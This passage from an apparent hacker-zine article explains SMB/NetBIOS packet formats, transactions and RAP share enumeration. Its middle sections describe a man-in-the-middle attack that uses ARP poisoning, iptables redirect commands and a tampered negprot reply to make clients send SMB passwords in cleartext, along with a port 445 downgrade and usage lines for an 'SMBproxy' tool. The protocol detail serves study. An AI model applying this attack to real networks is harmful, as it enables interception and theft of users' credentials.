is not included), &quot;data&quot; means what is above the NETBIOS header (it 
could be the SMB Base header + SMB Command header + DATA or NETBIOS 
names). 

NETBIOS names and encoding


A NETBIOS encoded name is 32 bytes long.

A NETBIOS name is always given in upper case characters.

It&#039;s very easy to encode a NETBIOS name. For example the NETBIOS name 
of my computer is &quot;BILL&quot; and it&#039;s a workstation so there is a &quot;0x00&quot;
for the sixteenth character.

Firstly, when a NETBIOS name is shorter than 15 bytes, it may be padded
on the right with spaces.

     &quot;BILL           &quot;      

In hexadecimal  0x42 0x49 0x4c 0x4c 0x20 0x20 ......0x00

Each bytes are splited into 4-bit halves.

0x4 0x2 0x4 0x9 0x4 0xc 0x4 0xc 0x2 0x0 .......

And each 4-bit half is added to the ASCII value of the &#039;A&#039; letter (0x41)

0x4 + 0x41 = 0x45  -&gt; ASCII value = E

0x2 + 0x41 = 0x43  -&gt; ASCII value = C
...

And you have the encoded NETBIOS name which is 32 bytes long.

Note :

 SMB can run directly over TCP without NBT (it&#039;s supported on Win2k 
and XP on port 445). The NETBIOS name are not limited to 15 characters. 

You don&#039;t need to know more, if you want to have more information 
about NETBIOS read [3] and [4].

----[ 6.3 - The SMB base header    


This header is used in all SMB packets, this is its definition :

    UCHAR Protocol[4];                // Contains 0xFF,&#039;SMB&#039;
    UCHAR Command;                    // Command code
    union {
        struct {
            UCHAR ErrorClass;         // Error class
            UCHAR Reserved;           // Reserved for future use
            USHORT Error;             // Error code
        } DosError;
        ULONG Status;                 // 32-bit error code
    } Status;
    UCHAR Flags;                      // Flags
    USHORT Flags2;                    // More flags
    union {
        USHORT Pad[6];                // Ensure section is 12 bytes long
        struct {
            USHORT PidHigh;           // High part of PID
            ULONG  Unused;            // Not used
            ULONG  Unused2;
    } Extra;
    };
    USHORT Tid;                       // Tree identifier
    USHORT Pid;                       // Caller&#039;s process id
    USHORT Uid;                       // Unauthenticated user id
    USHORT Mid;                       // multiplex id
    UCHAR  WordCount;                 // Count of parameter words
    USHORT ParameterWords[ WordCount ];    // The parameter words
    USHORT ByteCount;                 // Count of bytes
    UCHAR  Buffer[ ByteCount ];       // The bytes


The &quot;Protocol&quot; field contains the name of the protocol (SMB) with a 
0xFF before.

The &quot;Command&quot; field contains the value of the requested command. For 
example 0x72 is for the &quot;negotiate protocol&quot; command.
 
The &quot;Tid&quot; field is used when the client is successfully connected to a
ressource on a SMB server . The TID number identifies this ressource.

The &quot;Pid&quot; field is used when the client has successfully created a 
process on the server. The PID number identifies this process.

The &quot;Uid&quot; field is used when a user is successfully authenticated 
on a server. The UID number identify this user.

The &quot;Mid&quot; field is used in couple with the PID when a client has 
several requests on the server ( process, threads, file acess...).

The &quot;Flags2&quot; field is also important, when the bit 15 is armed, the 
strings are UNICODE strings .  



----[ 6.4 - Description of the most importants SMB commands


 SMB negotiate Protocol (negprot)
 
   The Negotiate Protocol Command is used in the first step of the SMB 
session establishment.

The Command code for the field &quot;Command&quot; in the SMB Base header is : 0x72.

Here is the description of the negprot request and reply headers : 

  Request header
    
 UCHAR WordCount;              Count of parameter words = 0
 USHORT ByteCount;             Count of data bytes
 struct {
   UCHAR BufferFormat;        0x02 -- Dialect
   UCHAR DialectName[];       ASCII null-terminated string
 } Dialects[];

   This packet is sent by the client to give the server its list of 
SMB protocol versions supported.

   Just three things to say, for this packets, &quot;WordCount&quot; field is 
always set to zero, &quot;ByteCount&quot; field is equal to the size of the 
&quot;Dialects&quot; structure, the field &quot;BufferFormat of &quot;Dialects&quot; is always
equal to 0x02.

   The &quot;DialectName&quot; string contains the name of the several SMB 
protocol versions supported by the client.    
 
  Reply header
    
 UCHAR WordCount;           Count of parameter words = 17
 USHORT DialectIndex;       Index of selected dialect
 UCHAR SecurityMode;        Security mode:
                            bit 0: 0 = share, 1 = user
                            bit 1: 1 = encrypt passwords
 USHORT MaxMpxCount;        Max pending multiplexed requests
 USHORT MaxNumberVcs;       Max VCs between client and server
 ULONG MaxBufferSize;       Max transmit buffer size
 ULONG MaxRawSize;          Maximum raw buffer size
 ULONG SessionKey;          Unique token identifying this session
 ULONG Capabilities;        Server capabilities
 ULONG SystemTimeLow;       System (UTC) time of the server (low).
 ULONG SystemTimeHigh;      System (UTC) time of the server (high).
 USHORT ServerTimeZone;     Time zone of server (min from UTC)
 UCHAR EncryptionKeyLength; Length of encryption key.
 USHORT ByteCount;          Count of data bytes
 UCHAR EncryptionKey[];     The challenge encryption key
 UCHAR OemDomainName[];     The name of the domain (in OEM chars)


This packet is sent by the server to give the client the list 
of SMB protocol versions supported, the SMB domain name of the server 
and an encryption key if necessary. 
 
IMPORTANT  :
 
The first interessant field is the &quot;SecurityMode&quot; byte. If the bit 0 
is armed we have a user security level. If it&#039;s not, we have a 
share security level. If the bit 1 is armed the password is encrypted
with a DES encryption in block mode.

The &quot;SessionKey&quot; field is used to identify the session . There is one 
single session key for one session.
 
The &quot;Capabilities&quot; field indicates if the server supported UNICODE 
strings or NT LM 0.12 particular commands ...
 
The datas are at the end of the header. With a negprot reply, 
these datas corespond to the strings &quot;EncryptionKey&quot; and 
&quot;OemDomainName&quot;.

The length of these two strings together is given by the &quot;Bytecount&quot; 
field.
 
The length of the &quot;EncrytionKey&quot; string is given by the field 
&quot;EncryptionKeyLength&quot;. The &quot;EncryptionKey&quot; string contains the Key for
the encryption of the password.

The length of &quot;OemDomainName&quot; is given by 
     (Bytecount - EncryptionKeyLength). 
The &quot;OemDomainName&quot; string contains the SMB domain name of the server
(in OEM chars).


 Session setup and X
  
   The Session Setup and X packets (SesssetupX or setupx for 
abbrevation) are used to deal with the identity of a user or when you
have to give a password to acess a ressource. 

   The Command code for the Session Setup and X command is 0x73.

  Request header
  
 UCHAR WordCount;               Count of parameter words = 13
 UCHAR AndXCommand;             Secondary (X) command;  0xFF = none
 UCHAR AndXReserved;            Reserved (must be 0)
 USHORT AndXOffset;             Offset to next command WordCount
 USHORT MaxBufferSize;          Client&#039;s maximum buffer size
 USHORT MaxMpxCount;            Actual maximum multiplexed pending
                                requests
 USHORT VcNumber;               0 = first (only), nonzero=additional
                                VC number
 ULONG SessionKey;              Session key (valid iff VcNumber != 0)
 USHORT                         Account password size, ANSI
 CaseInsensitivePasswordLength;
 USHORT                         Account password size, Unicode
 CaseSensitivePasswordLength;
 ULONG Reserved;                must be 0
 ULONG Capabilities;            Client capabilities
 USHORT ByteCount;              Count of data bytes;    min = 0
 UCHAR                          Account Password, ANSI
 CaseInsensitivePassword[];
 UCHAR CaseSensitivePassword[]; Account Password, Unicode
 STRING AccountName[];          Account Name, Unicode
 STRING PrimaryDomain[];        Client&#039;s primary domain, Unicode
 STRING NativeOS[];             Client&#039;s native operating system,
                                Unicode
 STRING NativeLanMan[];         Client&#039;s native LAN Manager type,
                                Unicode

This packet gives a lot of information about the client&#039;s system.

The field &quot;MaxBufferSize&quot; is very important, it gives the maximun 
size of data that the client can receive. If you set it to zero 
you will not receive any type of data from the server.
 
For the data, you have several strings. The most important are 
&quot;CaseSensitivePassword&quot; (password in UNICODE characters)
and &quot;CaseInsensitivePassword&quot; (password in ANSI characters).

One of both is used, it depends if the server is supporting UNICODE
strings or not (see negatiate protocol reply packet description). 
The length of the password is given in the fields 
&quot;CaseInsensitivePasswordLength&quot; or in
&quot;CaseSensitivePasswordLength&quot; .

For the other strings, see the description. The count of data bytes
is given by the &quot;Bytecount&quot; field.

 
  Reply header
  
 UCHAR WordCount;                   Count of parameter words = 3
 UCHAR AndXCommand;                 Secondary (X) command;  0xFF =
                                    none
 UCHAR AndXReserved;                Reserved (must be 0)
 USHORT AndXOffset;                 Offset to next command WordCount
 USHORT Action;                     Request mode:
                                    bit0 = logged in as GUEST
 USHORT ByteCount;                  Count of data bytes
 STRING NativeOS[];                 Server&#039;s native operating system
 STRING NativeLanMan[];             Server&#039;s native LAN Manager type
 STRING PrimaryDomain[];            Server&#039;s primary domain

Again, there are a lot of information on this packet : OS Type,
version of the SMB server software running on server and DomainName.

If the connection failed, there is nothing for NativeOS, NativeLanman
and PrimaryDomain strings.

OK I have finished with the &quot;hard&quot; part, we can play a little with 
the SMB protocol.

If you want to learn more about it, read [1].


----[ 6.5 - How I can recover SMB passwords in clear from the network 
            when they should be encrypted 


   During the session establishment, the password is sent to the server
during the SMB setupx Session. The SMB negprot reply packet contains 
a bit in the &quot;SecurityMode&quot; field which allows password encryption 
or not.

   So if you want to have a password in clear when all is encrypted, you
have two possibilities.

   The first one is to catch the encryption key and the encrypted 
password and brute force it ! It can be very long ...

	Some programs like LophtCrack (with SMBGrinder), dsniff or readsmb2 
sniff SMB encrypted passwords.

   The second way is to hijack the connection and to make the client 
believe that the password should not be encrypted.

   This technic is a bit complex to explain, but I will say how to 
do it !

   If the server is configured to encrypt password, the SMB negprot 
reply packet has the bit 1 of the &quot;SecurityMode&quot; field armed. But if 
an attacker sends a negprot reply packet with this bit equal to 
zero before the server, the password will be in clear in the 
SessetupX request packet .


                   negprot request 
  [client]     ------------------------&gt;         [server]

                [attacker waits for a negprot request]

  [client]   &lt;-------------|                     [server]
                           | fake negprot reply
                           |
                [attacker sends his fake neprot reply]


                  real negprot reply
  [client]   &lt;----------------------------------  [server]


                [attacker (does nothing)]


               sessetupX request with the password in clear text
  [client]    ----------------------------------&gt; [server]

                [attacker sniffs the password in clear text]


These diagrams illustrate a direct packet injection on the network.
In majority of case, this method doesn&#039;t work because the fake
negprot reply could treated after the real. There is also other 
problems, session failures, validity of password, does not work
in a switched environment...
We can avoid all of these problems by using Arp-Poisoning.

I will not explain and describe what is ARP-Poisoning, you could find a 
lot of docs about it on internet . But, if you don&#039;t know what it is, 
you just have to know that this attack allow the attacker to redirect 
and modify the traffic between the server and the client.

If you consider this situation, the attacker is between the both.

He is the man in the middle ...


----[ 6.6 - Man in the middle attack


          &quot;Attack where your enemy is not expecting you&quot;
                  
                                 Sun Tzu, &quot;The art of war&quot;

Now I will describe the man in the middle attack. This attack allow 
you to bypass switches, to avoid connection failures and to grab the 
password in clear.

Let&#039;s consider that the traffic between the client and the server 
is redirected by the attacker ( thanks to ARP poisoning !).
The client requests a SMB session to the server. 
The client will send packets to the SMB port (139) of the server. The 
attacker receives them. But the attacker doesn&#039;t redirect the packet to
the server. 
The whole incoming traffic to the server&#039;s SMB port (so to the attacker&#039;s 
machine) is redirected on the local port 1139 of the attacker (very easy 
to do with NAT and iptables).
The whole traffic (not only SMB) is redirected also with iptables and 
NAT. 
On the port 1139, there is a program (a transparent proxy program) that 
assumes the modification and redirection of the SMB packets.


The two iptables/NAT commands are :

To redirect the incoming traffic (on port 139 ) to a local port (1139 for
example).

#iptables -t nat -A PREROUTING -i eth0 -p tcp -s 192.168.1.3 \
--dport 139 -j REDIRECT --to-port 1139

192.168.1.3 is the IP address of the client 

To redirect the whole traffic

#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

What are the modifications ? :

The attacker modifies the negprot reply to have password in
clear text. The attacker recovers also the encryption key.
The attacker set to zero the value of the length of the encryption 
key and put the domain name instead of the encryption key. 
He sets the encryption bit of the &quot;SecurityMode&quot; field to 0. 
With this, the password will not be encrypted.

The client will send the password in clear in a sesssetupx request. 
When the attacker has the password, he encrypts it with the encryption
key recovered before and sends the sesssetupx request (with 
the encrypted password) to the server.

The server sends a sesssetupx reply to accept or refuse the session.
The attacker redirects the sesssetupx reply and the whole traffic 
after.

The session will not fail and nobody has saw our man in the middle !.


Description :


           ARP-P                  ARP-P
[client] &lt;---------  [attacker]  ---------&gt; [server]

The attacker processes to a ARP Poisoning attack to redirect the whole
traffic between the two machines.



[client] &lt;---------&gt; [attacker] &lt;---------&gt; [server]
 

The traffic redirection is operated with NAT and iptables.



            port 139
[client] -----------------&gt; [attacker]        [server]

The attacker receives the first packet to the SMB server port.




[client]  -----------------&gt;[attacker 139]        [server]
                                |
                                V
                            [attacker 1139]

The attacker redirects it to the port 1139.
On the port 1139, our proxy program is listening. 



          negprot request
[client] -----------------&gt; [attacker]        [server]

The attacker receives the negprot request.



                                     negprot request
[client]                   [attacker]---------------&gt; [server]

The attacker redirects directly the negprot request to the server.


                                     negprot reply
[client]         [attacker] &lt;----------------------------    [server]
                                 (encryption bit set
                              to have password encrypted)

The server replies with a negprot reply with the encryption 
bit set to have the password encrypted. The attacker doesn&#039;t
redirects this packet. He changes the encryption bit to have
plain text password .



                  negprot reply
[client] &lt;----------------------------- [attacker]        [server]
               (encryption bit set
           to have plain text password )

The attacker sends the modified negprot reply with the encryption 
bit changed to have the password in clear text. 




            sesssetupX request
[client] ------------------------&gt; [attacker]        [server]
         (password in clear text)

The client sends the password in clear text, the attacker recovers 
it.


                                     sesssetupX request
[client]                [attacker] ---------------------&gt;  [server]
                                    (password encrypted)

The attacker sends a sesssetupx request to the server with the 
encrypted password.



                                    sesssetupX reply
[client] &lt;------------- [attacker] &lt;----------------  [server]   

The servers sends the sesssetupx reply. The attacker redirects it.



[client] &lt;------------&gt; [attacker] &lt;--------------&gt; [server]

The attacker continues to redirect traffic between the two machines 
until the end of the SMB session.


The implementation of the man in the middle attack is given in the
Appendix A (the NAT and iptables rules are given also).

Take a look at the source code, you will learn a lot of
details !.


----[ 6.7 - Notes about windows 2k/XP SMB operating over TCP/IP 

As I wrote before, on Windows 2k/XP, SMB can run directly over TCP.
The SMB server is listening incoming connexions on port 445.
But it&#039;s not so &quot;directly&quot;. In fact instead of having a NETBIOS header
which is 4 bytes long, we have a other header which is 4 bytes long too.

Description :

        |---------------|
        |      TCP      |
        |---------------|
        |SPECIAL HEADER |
        |---------------|
        |  SMB BASE HDR |
        |---------------|

This special header is defined like this :

                UCHAR Zero;   	// Set to zero
                UCHAR Length[3];// Count of data bytes (the 4 bytes of
                                   the header are not included)

This special header is not very different than the NETBIOS header. You 
will understand why.

This is the NETBIOS header :

                UCHAR Type;   	// Type of the packet
                UCHAR Flags;  	// Flags
                USHORT Length;	// Count of data bytes (netbios header
                                                        not included)
							
When SMB is running over TCP, the NETBIOS request session should 
be not used.

In fact, the NETBIOS names of the client and of the server should not 
be sent. So the value of the &quot;Type&quot; field in the NETBIOS is always 
equal to zero (the &quot;Type&quot; field is different from zero when the client
sends his encoded NETBIOS name - Type = 0x81 - and when it receives 
the reply - Type = 0x82 -). Remember, during the SMB session the
Type field is equal to zero ( it&#039;s the &quot;Type&quot; code for the NETBIOS 
session message).

For the first byte nothing is different.

For the last three bytes now :

The &quot;Flags&quot; field of the NETBIOS header is always set to zero.
The length of the packet only takes the two last bytes of the special
header.

The three last bytes are the same.

To conclude there is no difference between the NETBIOS and the special
header when NETBIOS is not used.

Downgrade attack :

If the client (running on windows XP or 2k) has NBT enabled, it always
try to connect to the port 139 and 445 simultaneously. If the client 
has a response from the port 445, the client will send a RST packet 
to the port 139. If the client has no response from the port 445, it 
will try to connect on port 139. If it has no response from the both, 
the session will fail.
If the client has NBT disabled, the client will try on the port 445 
only.

To perform a Downgrade attack i.e force the client to not use the port 
445 and to use the port 139, you have to make believe to the client 
that the 445 is closed. With the transparent proxy attack it&#039;s very 
easy, with iptables you have just to redirect the incoming traffic
on the attacker&#039;s machine on port 445 to a closed port. With this
the client will use the port 139 (the iptables rules for this is
given in appendix A).
This will work if NBT is enabled.

If the client has NBT disabled, the transparent proxy will operate the 
SMB traffic on port 445. You&#039;ve got an option on the program for this.

Ok, we have finished with the attack for recovering passwords.
We will study now an another important part of SMB.

                  
--[ 7 - Transaction subprotocol and RAP commands


I will explain in this chapter a panel of special (and obscur ) 
SMB commands : the RAP commands.
These commands use the transaction subprotocol. 
I will also describe this subprotocol.

----[ 7.1 - The transaction subprotocol

When a large amount of data is sent during a SMB session or if there is
a specific operation requested,the SMB protocol includes a transaction 
subprotocol.  

The transaction subprotocol is mainly used for SMB Remote Procedure 
Calls : The RAP commands (RAP for Remote Administration Protocol). 
But I will explain it later. 

The transaction subprotocol is not a derived protocol of SMB. The 
transaction subprotocol is just an other command for SMB. So the
transaction subprotocol is layered on SMB base header and the command 
code for the transaction subprotocol is 0x25.

Like the other commands there is a request and a reply.

This is the Transaction request header :
				  
 UCHAR WordCount;                 Count of parameter words;   value =
                                  (14 + value of the &quot;SetupCount&quot; field)
 USHORT TotalParameterCount;      Total parameter bytes being sent
 USHORT TotalDataCount;           Total data bytes being sent
 USHORT MaxParameterCount;        Max parameter bytes to return
 USHORT MaxDataCount;             Max data bytes to return
 UCHAR MaxSetupCount;             Max setup words to return
 UCHAR Reserved;
 USHORT Flags;                    Additional information:
                                  bit 0 - also disconnect TID in TID
                                  bit 1 - one-way transaction (no
                                  response)
 ULONG Timeout;
 USHORT Reserved2;
 USHORT ParameterCount;           Parameter bytes sent this buffer
 USHORT ParameterOffset;          Offset (from header start) to
                                  Parameters
 USHORT DataCount;                Data bytes sent this buffer
 USHORT DataOffset;               Offset (from header start) to data
 UCHAR SetupCount;                Count of setup words
 UCHAR Reserved3;                 Reserved (pad above to word)
 USHORT Setup[SetupCount];        Setup words (# = SetupWordCount)
 USHORT ByteCount;                Count of data bytes
 STRING Name[];                   Name of transaction (NULL if
                                  SMB_COM_TRANSACTION2)
 UCHAR Pad[];                     Pad to SHORT or LONG
 UCHAR Parameters[                Parameter bytes (# = ParameterCount)
 ParameterCount];
 UCHAR Pad1[];                    Pad to SHORT or LONG
 UCHAR Data[ DataCount ];         Data bytes (# = DataCount)

In a majority of case, a RAP command sent with  Transaction subprotocol 
may need several Transaction packets for sending the parameters 
and data bytes. The parameters bytes are usually sent first, followed 
by the data bytes. If several transaction packets must be involved, 
the server sends this small packet for acknoledgement between each 
transaction packets :

Interim Reply packets :

 UCHAR WordCount;                 Count of parameter words = 0
 USHORT ByteCount;                Count of data bytes = 0

For the transaction request header, the &quot;TotalParameterCount&quot; field 
represents a count of paramaters bytes to be sent and it&#039;s the same 
for the &quot;TotalDataCount&quot; field (count of data bytes to be sent). 
 
The offset from the start of the SMB base header to the parameters 
bytes and the data bytes are given with the &quot;ParameterOffset&quot; and 
&quot;DataOffset&quot; fields. 

The parameters bytes are in the &quot;Parameters&quot; field.
The data bytes are in the &quot;Data&quot; field.

You must understand that these &quot;Parameters&quot; and &quot;Data&quot; fields are used 
for the RAP command. &quot;Parameters&quot; contains the parameters bytes for 
the RAP command and &quot;Data&quot;, the data bytes.

The fields for &quot;DataCount&quot; and &quot;ParameterCount&quot; represent respectivily 
the count of data bytes and the count of parameters bytes present in 
the considereted transaction packet. If these fields are equal to 
the &quot;TotalParameterCount&quot; and the &quot;TotalDataCount&quot;, it involved that 
all parameter and data bytes fit in a single packet. If they are not, 
it involved that the server (for request) or the client (for reply) 
must wait for another packets. When all packets are received, the 
parameter and data bytes are marshalled for analysis.

Take a look at the field &quot;WordCount&quot;, it contains the value  : 
14 + &quot;SetupCount&quot; field, in majority of case SetupCount is equal to 0.

The Transaction reply header: 

There is not a big difference between the reply and the request

 UCHAR WordCount;                 Count of data bytes; value = 10 +
                                  &quot;Setupcount&quot; field.
 USHORT TotalParameterCount;      Total parameter bytes being sent
 USHORT TotalDataCount;           Total data bytes being sent
 USHORT Reserved;
 USHORT ParameterCount;           Parameter bytes sent this buffer
 USHORT ParameterOffset;          Offset (from header start) to
                                  Parameters
 USHORT ParameterDisplacement;    Displacement of these Parameter
                                  bytes
 USHORT DataCount;                Data bytes sent this buffer
 USHORT DataOffset;               Offset (from header start) to data
 USHORT DataDisplacement;         Displacement of these data bytes
 UCHAR SetupCount;                Count of setup words
 UCHAR Reserved2;                 Reserved (pad above to word)
 USHORT Setup[SetupWordCount];    Setup words (# = SetupWordCount)
 USHORT ByteCount;                Count of data bytes
 UCHAR Pad[];                     Pad to SHORT or LONG
 UCHAR                            Parameter bytes (# = ParameterCount)
 Parameters[ParameterCount];
 UCHAR Pad1[];                    Pad to SHORT or LONG
 UCHAR Data[DataCount];           Data bytes (# = DataCount)

The client must use the &quot;ParameterOffset&quot; and &quot;DataOffset&quot; to know the 
offset (from the beginning of the SMB base header) of data and 
parameters bytes.


----[ 7.2 - RAP commands     

RAP (Remote Administration Protocol) is the SMB implementation of 
RPC.   

 
RAP request : 

       |---------------------------|
       |TCP HDR                    |
       |---------------------------|
       |NETBIOS HDR                |
       |---------------------------|
       |SMB BASE HDR               |
       |---------------------------|
       |SMB TRANSACTION REQUEST HDR|
       |---------------------------|
       |RAP REQUEST PARAMETERS     |
       |---------------------------| 
       |RAP REQUEST DATAS          | 
       |---------------------------|
       
RAP Reply :

       |---------------------------|
       |TCP HDR                    |
       |---------------------------|
       |NETBIOS HDR                |
       |---------------------------|
       |SMB BASE HDR               |
       |---------------------------|
       |SMB TRANSACTION REPLY HDR  |
       |---------------------------|
       |RAP REPLY PARAMETERS       |
       |---------------------------|
       |RAP REPLY DATAS            |
       |---------------------------| 	

        
 When you use a RAP command you always find the string &quot;\PIPE\LANMAN&quot; 
 in the &quot;Name&quot; field in the transaction (request and reply) header.
 
 These are several examples of RAP commands : 
 
 -NETSHAREENUM : Retrieve information about each shared ressource 
                 on a server

 -NETSERVERENUM2 : List all the computer of specified types in a 
                   specified domain

 -NETSERVERGETINFO : Get information about a specified server

 -NETSHAREGETINFO : Retrieve information about a paticular shared 
                    ressource

 -NETWKSTAUSERLOGON : Execute on a SMB server for logging an user.
 
 -NETWSTAUSERLOGOFF : The same but for deloging.

 -NETUSERGETINFO : Obtain information about a particular user.

 -NETWKSTAGETINFO : Obtain information about a particular station.

 -SAMOEMCHANGEPASSWORD : For changing the password of a specified user on 
                         a remote SMB server.

I&#039;m not going to describe all of these commands, I will just take one for 
example (to have a listing of shared resource avaible on a server).

If you want to know more about RAP commands read [2].


--[ 8 - Using RAP commands to list available shares on a server

 
 This part is a complement of the previous chapter. I will explain 
how the RAP commands work by giving an example.


The program given in Appendix B is the implementation of what is 
explained in this chapter. It does the same things that the commands 
&quot;net view \\ServerIP&quot; (for DOS) or &quot;smbclient -L ServerIP -N &quot; 
(on Linux).  But this program allows you to specified the NETBIOS 
name, it is a bit anonymous. If you read this source you will 
learn a lot a things about SMB network programming.
 
How I can retrieve SMB everyone shares on a network :

The process is easy to understand. The client must be authentificated 
on the server . The client identifies itself with the process developed 
in chapter 3 (with no password). When the server has checked the 
identity of the client, the client sends a Tconx request (after the 
Sessetupx reply).

Tconx means &quot;Tree CONnect and X).

The TconX request packet is used to acess to a shared ressource.

----[ 8.1 - Tconx Packets 
 

 Request header
  
 The TconX packets are layered on the SMB Base Header (&quot;Command&quot; = 0x75).

 
UCHAR WordCount;                   Count of parameter words = 4
UCHAR AndXCommand;                 Secondary (X) command; 0xFF = none
UCHAR AndXReserved;                Reserved (must be 0)
USHORT AndXOffset;                 Offset to next command WordCount
USHORT Flags;                      Additional information
                                   
USHORT PasswordLength;             Length of Password[]
USHORT ByteCount;                  Count of data bytes;    min = 3
UCHAR Password[];                  Password
STRING Path[];                     Server name and share name
STRING Service[];                  Service name



The password was sent during the session establishement. 
The Password length is set to 1 and and the Password 
string contains null value (0x00).

The string &quot;Path&quot; contains the name of the ressource that client wishes 
connect. It use the unicode style syntax . For example I want to connect 
 on a share called &quot;myshare&quot; on a server called &quot;myserver&quot; . The 
Path string will containt &quot;\\myserver\myshare&quot;. 

The &quot;Service&quot; string contains the type of ressource requested :
       	
	string		Type of ressource
	
	&quot;A:&quot; 		disk share.
	&quot;LPT1:&quot; 	printer.
	&quot;IPC&quot;  	        named pipe.
	&quot;COMM&quot; 	        communications device.
	&quot;?????&quot; 	any type of device.
 
For scaning any type of device you must use the &quot;?????&quot; string in the 
&quot;Service&quot; field.

After sending your Tconx request on the server. The server replies with 
a TconX reply. You must recover the &quot;Tid&quot; field (in the SMB Base header) 
which is the Transaction request with the RAP command. 
You must specified to the server that you want to know which ressources 
are available. For this, you must use the RAP command : NETSHAREENUM.


----[ 8.2 - Explanation of the RAP command &quot;NetShareEnum&quot; :


The RAP command that we will study is NetShareEnum.

The RAP Command &quot;NetshareEnum&quot; request  :

The field &quot;Parameters&quot; of the transaction request header received :

  The 16 bit code of function NetShareEnum : 0;
  
  The parameter desriptor string : &quot;WrLeh&quot; 
  
  Data descriptor string for returned data : &quot;B13BWZ&quot;
  
  A 16 bit integer with a value of x01;
  
  A 16 bit integer that contains the size of the receive buffer.

It will be too long to explain how parameter and data descriptor strings 
works. These strings are used to know the size and the format of 
parameters and datas. One parameter and one data descriptor string 
is defined for each RAP command.

if you want to know more about this strings, read [2].

No datas are needed for this request so the &quot;DataCount&quot; and 
&quot;TotalDataCount&quot; fields are equal to zero. 


  |--------------------------------------------|
  |             NETBIOS HDR                    |---------&gt; 4 bytes
  |--------------------------------------------| 
  |             SMB BASE HDR   	               |---------&gt; 32 Bytes
  |--------------------------------------------|	
  |        SMB TRANSACTION REQUEST HDR         |
  |--------------------------------------------|

The Transaction request &quot;Parameters&quot; field receives the parameters 
for the RAP request : 

  |--------------|
  |      0x0000  | ----------------------------------------&gt; A
  |--------------|--------------|--------------|
  |   W       r  |  L        e  |  h       0x00|-----------&gt; B
  |--------------|--------------|--------------|-------|
  |   B       1  |  3        B  |  W         Z |  0x00 |---&gt; C
  |--------------|--------------|--------------|-------|
  |     0x0001   |     0xffff   |--------------------------&gt; D
  |--------------|--------------|
  
  
  A : The NetshareEmun function code : 0x00                            
  B : The parameter descriptor string
  C : The data descriptor string
  D : 0x01 (defined value) and 0xffff (Max size of the received buffer) 
  
And the server replies :

the &quot;Parameters&quot; field of the transaction reply header receives :

 A 16 bit integer word that contains the return status code :

 Succes 0
 Access Denied 5
 Network Acess Denied 65
 More data 234
 Server not started 2114
 Transaction configuration bad 2141

 A 16 bit &quot;converted word&quot;, uses to calculate an offset to remark 
strings.
 
 A 16 bit containts the number of entries returned = number of 
 SHARE_INFO structure (see below ).
 
 A 16 bit representing the number of available entries.
 
 
 The field &quot;Data&quot; of the transaction reply header contains the several
SHARE_INFO structures.
 
 The SHARE_INFO structure contains the information about each shared
ressource available and it is defined like this :
 
  struct SHARE_INFO {
    char shi1_netname[13]; /*Name of the ressource*/
    
    char shi1_pad; /*Pad to a word*/
                     
		     
    unsigned short shi1_type; 

       /*Code specifies the type of the shared resssource :
          0 Disk Directory tree
          1 Printer queue 
          2 Communications device 
          3 IPC*/


    char *shi1_remark; /*Remark on the specified 
                         ressource*/

		      }

 shi1_remark is a 32 bits pointer to a string. This string contains a
 remark about a shared ressource. You must substract the 16 lower 
 bits of &quot;shi1_remark&quot; to the &quot;converter word&quot; to know the offset 
 between this string and the beginning of the RAP reply parameters 
 header.
 
 In fact with a ascii schema :
 
  |--------------------------------------------|
  |             NETBIOS HDR                    |------------&gt; 4 bytes
  |--------------------------------------------|
  |             SMB BASE HDR   	               |------------&gt; 32 Bytes
  |--------------------------------------------|	
  |             SMB TRANS REPLY HDR            |
  |--------------------------------------------|
 
Description of the &quot;Parameters&quot; section of the Transaction reply packet 
(corresponding to the parameters of the NetShareEnum reply) :
 
  |--------------------------------------------|
  |           status code                      |-------------&gt; 2 bytes
  |--------------------------------------------|
  |           converted word                   |-------------&gt; 2 bytes
  |--------------------------------------------|
  |           number of entries returned       |-------------&gt; 2 bytes
  |--------------------------------------------|
  |           number of entries available      |-------------&gt; 2 bytes
  |--------------------------------------------|
  
Data section of the Transaction reply (corresponding to the 
several SHARE_INFO structures if there is more than one ressource
available) :  
  
  |--------------------------------------------|
  |         shi1_netname                       |-----------&gt; 13 bytes
  |--------------------------------------------|
  |         shi1_pad to pad to word            |-----------&gt; 1 byte  
  |--------------------------------------------|
  | type of service                            |-----------&gt; 2 bytes
  |--------------------------------------------|
  | pointer to remark string                   |-----------&gt; 4 bytes
  |--------------------------------------------|
                .
          Another SHARE_INFO structures	
	        .
  |--------------------------------------------|
  |               remark string 1              |
  |--------------------------------------------|
  |          another remarks strings           |
  |--------------------------------------------|


--[ 9 - Conclusion :

 I hope you have learned a lot of things in this article.
 If you have any comments, questions, send it at :
 
                   &lt;ledin@encephalon-zero.com&gt;

--[ 10 - References

[1] &quot;A common Internet File System (CIFS/1.0) Protocol
    Preliminary Draft&quot;, Paul J.Leach and Dilip C. Naik
    http://www.snia.org/tech_activities/CIFS/CIFS-TR-1p00_FINAL.pdf

[2] &quot;CIFS Remote Administration Protocol Preliminary Draft&quot;
    Paul J.Leach and Dilip C. Naik
    http://us6.samba.org/samba/ftp/specs/cifsrap2.txt

[3] RFC 1001
    http://www.faqs.org/rfcs/rfc1001.html

[4] RFC 1002
    http://www.faqs.org/rfcs/rfc1002.html

--[ 11 - Thanks

Just a Merry Christmas to TearDrop, Frealek and &quot;el Tonio&quot;.

A big thank to TearDrop for all. Without him, nothing could
be possible !

Take a look at &lt;gps.sourceforge.net&gt;, you will find a very good 
(and free) scanner !.

Thanks to Mr D. (my network administrator !), for all the advices
and the several Linux distribs.

Thanks to the Chemical brothers for the inspirational music.

Thanks to the phrack staff, for all their remarks and particulary 
about the transparent proxy attack.

To you for reading this article ;).



--[  Appendix A

This program allows you to have password in clear directly from
the network when they should be encrypted. It works with libnet 
(v 1.1 !) and libpcap.
This is the implementation of the Transparent proxy attack of the
chapter 6.6.

libnet : www.packetfactory.net

libpcap : www.tcpdump.org

You must be root to compile and to execute this program !

If you want to compile it, you could use : 
       &quot;gcc SMBproxy.c -o SMBproxy -lnet -lpcap&quot;

If you want to use it :
       &quot;SMBproxy -i interface  
                  -c Client&#039;s IP address 
		  -s Server&#039;s IP address 
		  -f your fake IP (what you want : 6.6.6.6 for example)&quot;
                  -l listening port (1139 by default)

Be careful the program will ask you about Windows 2k/XP specifictions
support. But you must answer &quot;y&quot; when NBT is disabled not when it&#039;s 
enabled on Windows 2k/XP !

You give the IP adress of a client and of the server, this program 
waits a connection of the client to a SMBserver, launches the attack, 
recovers the password and redirects the traffic.

The fake IP parameter corresponds to your fake IP, give what you want !
